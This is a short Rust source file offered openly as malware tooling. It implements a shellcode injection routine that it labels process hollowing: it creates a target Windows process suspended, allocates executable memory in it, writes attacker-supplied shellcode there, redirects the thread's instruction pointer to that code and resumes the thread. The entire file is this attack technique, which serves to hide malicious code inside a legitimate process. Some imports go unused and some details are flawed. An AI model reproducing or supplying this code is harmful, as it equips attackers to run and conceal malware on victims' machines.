use std::ptr;
use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, GetThreadContext, SetThreadContext, CONTEXT};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{IMAGE_NT_HEADERS64, IMAGE_OPTIONAL_HEADER64, IMAGE_SECTION_HEADER, CONTEXT_FULL};
use winapi::um::winbase::CREATE_SUSPENDED;

// Process Hollowing: Replace target process memory with payload
pub unsafe fn hollow_process(target: &str, shellcode: &[u8]) {
    let mut startup_info = std::mem::zeroed();
    let mut process_info = std::mem::zeroed();

    let success = CreateProcessA(
        target.as_ptr() as *const i8,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut startup_info,
        &mut process_info
    );

    if success == 0 {
        panic!("Failed to create process");
    }

    let h_process = process_info.hProcess;
    let h_thread = process_info.hThread;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(h_thread, &mut ctx);

    // Allocate new memory for shellcode in remote process
    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), 0x3000, 0x40);
    WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const _, shellcode.len(), ptr::null_mut());

    // Modify Execution Flow
    #[cfg(target_arch = "x86_64")]
    {
        ctx.Rip = addr as u64;
    }

    SetThreadContext(h_thread, &ctx);
    ResumeThread(h_thread);
}
